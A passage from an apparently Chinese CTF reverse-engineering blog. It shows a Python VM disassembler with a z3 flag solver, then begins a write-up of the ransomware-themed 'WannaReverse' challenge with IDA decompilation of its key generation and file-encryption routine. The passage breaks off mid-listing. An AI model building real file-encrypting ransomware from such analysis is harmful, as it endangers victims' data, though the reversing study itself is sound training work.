<span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x2d</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0xe</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x2e</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0xf</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x2f</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x10</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x30</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x11</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x31</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x12</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x32</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x13</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x33</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf4</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>,]</span><br><span class="line"></span><br><span class="line">opc =[<span class="number">0xf5</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe2</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe2</span>, <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe2</span>, <span class="number">0x3</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x3</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe2</span>, <span class="number">0x4</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x3</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x4</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe2</span>, <span class="number">0x5</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x4</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x5</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe2</span>, <span class="number">0x6</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x5</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x6</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe2</span>, <span class="number">0x7</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe3</span>, <span class="number">0x8</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe5</span>, <span class="number">0xc</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf6</span>, <span class="number">0xf7</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x6</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x7</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe2</span>, <span class="number">0x8</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe3</span>, <span class="number">0x9</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe5</span>, <span class="number">0xc</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf6</span>, <span class="number">0xf7</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x7</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x8</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe2</span>, <span class="number">0x9</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe3</span>, <span class="number">0xa</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe5</span>, <span class="number">0xc</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf6</span>, <span class="number">0xf7</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x8</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0xd</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe2</span>, <span class="number">0x13</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf8</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0xd</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe7</span>, <span class="number">0x13</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0xe</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe2</span>, <span class="number">0x12</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf8</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0xe</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe7</span>, <span class="number">0x12</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0xf</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe2</span>, <span class="number">0x11</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf8</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0xf</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe7</span>, <span class="number">0x11</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf4</span>]</span><br><span class="line">rip = <span class="number">0</span></span><br><span class="line">print(<span class="string">&#x27;reg[1]=18&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> rip&lt;len(opc):</span><br><span class="line">    op = opc[rip]<span class="number">-0x100</span></span><br><span class="line">    print(<span class="string">&#x27;%02x:%02X:&#x27;</span>%(rip,op),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> op==<span class="number">-15</span>:</span><br><span class="line"><span class="comment"># print(&#x27;sub_b5f&#x27;)</span></span><br><span class="line">        cas = opc[rip+<span class="number">1</span>]</span><br><span class="line">        dst = opc[rip+<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">if</span> cas==<span class="number">0xe1</span>:</span><br><span class="line">            print(<span class="string">&#x27;reg[0]=input[%d]&#x27;</span>%dst)</span><br><span class="line">        <span class="keyword">elif</span> cas==<span class="number">0xe2</span>:</span><br><span class="line">            print(<span class="string">&#x27;reg[1]=input[%d]&#x27;</span>%dst)</span><br><span class="line">        <span class="keyword">elif</span> cas==<span class="number">0xe3</span>:</span><br><span class="line">            print(<span class="string">&#x27;reg[2]=input[%d]&#x27;</span>%dst)</span><br><span class="line">        <span class="keyword">elif</span> cas==<span class="number">0xe4</span>:</span><br><span class="line">            print(<span class="string">&#x27;input[%d]=reg[0]&#x27;</span>%dst)</span><br><span class="line">        <span class="keyword">elif</span> cas==<span class="number">0xe5</span>:</span><br><span class="line">            print(<span class="string">&#x27;reg[3]=input[%d]&#x27;</span>%dst)</span><br><span class="line">        <span class="keyword">elif</span> cas==<span class="number">0xe7</span>:</span><br><span class="line">            print(<span class="string">&#x27;input[%d]=reg[1]&#x27;</span>%dst)</span><br><span class="line"></span><br><span class="line">        rip+=<span class="number">6</span></span><br><span class="line">    <span class="keyword">elif</span> op==<span class="number">-14</span>:</span><br><span class="line">        print(<span class="string">&#x27;xor reg[0],reg[1]&#x27;</span>)</span><br><span class="line">        rip+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> op==<span class="number">-11</span>:</span><br><span class="line">        print(<span class="string">&#x27;checkLen&#x27;</span>)</span><br><span class="line">        rip+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> op==<span class="number">-12</span>:</span><br><span class="line">        print(<span class="string">&#x27;nop&#x27;</span>)</span><br><span class="line">        rip+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> op==<span class="number">-9</span>:</span><br><span class="line">        print(<span class="string">&#x27;mul reg[0],reg[3]&#x27;</span>)</span><br><span class="line">        rip+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> op==<span class="number">-8</span>:</span><br><span class="line">        print(<span class="string">&#x27;swap reg[0],reg[1]&#x27;</span>)</span><br><span class="line">        rip+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> op==<span class="number">-10</span>:</span><br><span class="line">        print(<span class="string">&#x27;reg[0]=reg[2]+2*reg[1]+3*reg[0]&#x27;</span>)</span><br><span class="line">        rip+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&#x27;unknown&#x27;</span>)</span><br><span class="line">        rip+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;end&#x27;</span>)</span><br><span class="line">res = <span class="string">&#x27;Fz&#123;aM&#123;aM|&#125;fMt~suM !!&#x27;</span></span><br><span class="line">a = [ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> res]</span><br><span class="line">aa = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a))]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(aa)):</span><br><span class="line">    a[i]^=<span class="number">18</span></span><br><span class="line">print(bytes(a))</span><br><span class="line"></span><br><span class="line"><span class="comment"># a = [ord(i) for i in res]</span></span><br><span class="line">a = [<span class="number">0x69</span>, <span class="number">0x45</span>, <span class="number">0x2a</span>, <span class="number">0x37</span>, <span class="number">0x9</span>, <span class="number">0x17</span>, <span class="number">0xc5</span>, <span class="number">0xb</span>, <span class="number">0x5c</span>, <span class="number">0x72</span>, <span class="number">0x33</span>, <span class="number">0x76</span>, <span class="number">0x33</span>, <span class="number">0x21</span>, <span class="number">0x74</span>, <span class="number">0x31</span>, <span class="number">0x5f</span>, <span class="number">0x33</span>, <span class="number">0x73</span>, <span class="number">0x72</span>]</span><br><span class="line">print(len(a))</span><br><span class="line"><span class="comment">#for i in range(len(a)):</span></span><br><span class="line"><span class="comment">#    a[i]=a[i]^18</span></span><br><span class="line"><span class="comment"># print(bytes(aa))</span></span><br><span class="line">v = [BitVec(<span class="string">&#x27;v%d&#x27;</span>%i,<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>)]</span><br><span class="line">s = Solver()</span><br><span class="line">s.add((v[<span class="number">0</span>]^v[<span class="number">1</span>])==a[<span class="number">0</span>])</span><br><span class="line">s.add((v[<span class="number">1</span>]^v[<span class="number">2</span>])==a[<span class="number">1</span>])</span><br><span class="line">s.add((v[<span class="number">2</span>]^v[<span class="number">3</span>])==a[<span class="number">2</span>])</span><br><span class="line">s.add((v[<span class="number">3</span>]^v[<span class="number">4</span>])==a[<span class="number">3</span>])</span><br><span class="line">s.add((v[<span class="number">4</span>]^v[<span class="number">5</span>])==a[<span class="number">4</span>])</span><br><span class="line">s.add((v[<span class="number">5</span>]^v[<span class="number">6</span>])==a[<span class="number">5</span>])</span><br><span class="line">s.add(v[<span class="number">12</span>]*(v[<span class="number">8</span>]+<span class="number">2</span>*v[<span class="number">7</span>]+<span class="number">3</span>*v[<span class="number">6</span>])==a[<span class="number">6</span>])</span><br><span class="line">s.add(v[<span class="number">12</span>]*(v[<span class="number">9</span>]+<span class="number">2</span>*v[<span class="number">8</span>]+<span class="number">3</span>*v[<span class="number">7</span>])==a[<span class="number">7</span>])</span><br><span class="line">s.add(v[<span class="number">12</span>]*(v[<span class="number">10</span>]+<span class="number">2</span>*v[<span class="number">9</span>]+<span class="number">3</span>*v[<span class="number">8</span>])==a[<span class="number">8</span>])</span><br><span class="line">s.add(v[<span class="number">10</span>]==a[<span class="number">10</span>])</span><br><span class="line">s.add(v[<span class="number">9</span>]==a[<span class="number">9</span>])</span><br><span class="line"><span class="comment"># s.add(v[12]*(v[11]+2*v[10]+3*v[9])==a[9])</span></span><br><span class="line">s.add(v[<span class="number">16</span>]==a[<span class="number">16</span>])</span><br><span class="line">s.add(v[<span class="number">11</span>]==a[<span class="number">11</span>])</span><br><span class="line">s.add(v[<span class="number">13</span>]==a[<span class="number">19</span>])</span><br><span class="line">s.add(v[<span class="number">19</span>]==a[<span class="number">13</span>])</span><br><span class="line">s.add(v[<span class="number">14</span>]==a[<span class="number">18</span>])</span><br><span class="line">s.add(v[<span class="number">18</span>]==a[<span class="number">14</span>])</span><br><span class="line">s.add(v[<span class="number">15</span>]==a[<span class="number">17</span>])</span><br><span class="line">s.add(v[<span class="number">17</span>]==a[<span class="number">15</span>])</span><br><span class="line">s.add(v[<span class="number">12</span>]==a[<span class="number">12</span>])</span><br><span class="line"><span class="comment"># s.add(v[20]==a[20])</span></span><br><span class="line">s.add(v[<span class="number">0</span>]!=<span class="number">0</span>)</span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">if</span> s.check()==sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> v:</span><br><span class="line">        flag.append(m[i].as_long())</span><br><span class="line">        print(m[i])</span><br><span class="line">print(bytes(flag))</span><br></pre></td></tr></table></figure>

<p>感觉好坑啊</p>
<h2 id="rev-GKCTF2020-WannaReverse"><a href="#rev-GKCTF2020-WannaReverse" class="headerlink" title="[rev][GKCTF2020]WannaReverse"></a>[rev][GKCTF2020]WannaReverse</h2><ol>
<li><p>打开任意一个都会换壁纸</p>
</li>
<li><p>IDA打开WannaReverse.exe，找到主函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_403220</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line"><span class="keyword">void</span> *v1; <span class="comment">// ecx</span></span><br><span class="line"><span class="keyword">signed</span> <span class="keyword">int</span> v2; <span class="comment">// esi</span></span><br><span class="line"><span class="keyword">char</span> v3; <span class="comment">// al</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *v4; <span class="comment">// ecx</span></span><br><span class="line"><span class="keyword">char</span> v6[<span class="number">32</span>]; <span class="comment">// [esp+8h] [ebp-34h]</span></span><br><span class="line"><span class="keyword">char</span> v7; <span class="comment">// [esp+28h] [ebp-14h]</span></span><br><span class="line"><span class="keyword">char</span> v8[<span class="number">10</span>]; <span class="comment">// [esp+2Ch] [ebp-10h]</span></span><br><span class="line">   </span><br><span class="line">*(_OWORD *)v6 = <span class="number">0</span>i64;</span><br><span class="line">*(_OWORD *)&amp;v6[<span class="number">16</span>] = <span class="number">0</span>i64;</span><br><span class="line">WinExec(<span class="string">&quot;clickme.exe&quot;</span>, <span class="number">1u</span>);</span><br><span class="line"><span class="built_in">strcpy</span>(v8, <span class="string">&quot;0123456789&quot;</span>);</span><br><span class="line">v0 = sub_415930(<span class="number">0</span>);</span><br><span class="line">sub_40BAB0(v0);</span><br><span class="line">v2 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    v6[v2++] = v8[sub_40BA70(v1) % <span class="number">10</span>];</span><br><span class="line"><span class="keyword">while</span> ( v2 &lt; <span class="number">32</span> );</span><br><span class="line">v7 = <span class="number">0</span>;</span><br><span class="line">v3 = sub_402D00((<span class="keyword">int</span>)v1, (<span class="keyword">int</span>)v6);</span><br><span class="line">v4 = <span class="string">&quot;encrypto success!&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> ( !v3 )</span><br><span class="line">    v4 = <span class="string">&quot;encrypto false!&quot;</span>;</span><br><span class="line"><span class="built_in">puts</span>(v4);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> 首先运行clickme.exe，然后生成一个32位的随即密钥，传入sub_402D00，所以sub_402D00应该是加密函数</p>
</li>
<li><p>查看加密函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> __fastcall <span class="title">sub_402D00</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *FILE_read; <span class="comment">// eax</span></span><br><span class="line">  FILE *FILE_read_1; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> len_0; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">int</span> len; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">char</span> *buf_read; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> keyLen; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">char</span> *buf_read_1; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">char</span> *key; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v11; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">bool</span> v12; <span class="comment">// cf</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v13; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v14; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v15; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// eax</span></span><br><span class="line">  BigInteger *v17; <span class="comment">// eax</span></span><br><span class="line">  BigInteger *v18; <span class="comment">// eax</span></span><br><span class="line">  BigInteger *v19; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">char</span> *v20; <span class="comment">// edx</span></span><br><span class="line">  BigInteger *v21; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">char</span> *v22; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v23; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v24; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">char</span> v25; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">char</span> *v26; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">char</span> v27; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">int</span> FILE_write; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v29; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">int</span> v30; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">char</span> *v31; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v32; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v33; <span class="comment">// cl</span></span><br><span class="line">  <span class="keyword">int</span> len_1; <span class="comment">// [esp+Ch] [ebp-29Ch]</span></span><br><span class="line">  FILE *FILE_read_2; <span class="comment">// [esp+10h] [ebp-298h]</span></span><br><span class="line">  <span class="keyword">char</span> *buf_read_2; <span class="comment">// [esp+14h] [ebp-294h]</span></span><br><span class="line">  <span class="keyword">char</span> v37; <span class="comment">// [esp+18h] [ebp-290h]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *arg2; <span class="comment">// [esp+1Ch] [ebp-28Ch]</span></span><br><span class="line">  <span class="keyword">char</span> key_1[<span class="number">256</span>]; <span class="comment">// [esp+20h] [ebp-288h]</span></span><br><span class="line">  <span class="keyword">int</span> v40; <span class="comment">// [esp+120h] [ebp-188h]</span></span><br><span class="line">  <span class="keyword">int</span> v41; <span class="comment">// [esp+124h] [ebp-184h]</span></span><br><span class="line">  <span class="keyword">int</span> v42[<span class="number">7</span>]; <span class="comment">// [esp+128h] [ebp-180h]</span></span><br><span class="line">  BigInteger v43; <span class="comment">// [esp+144h] [ebp-164h]</span></span><br><span class="line">  BigInteger v44; <span class="comment">// 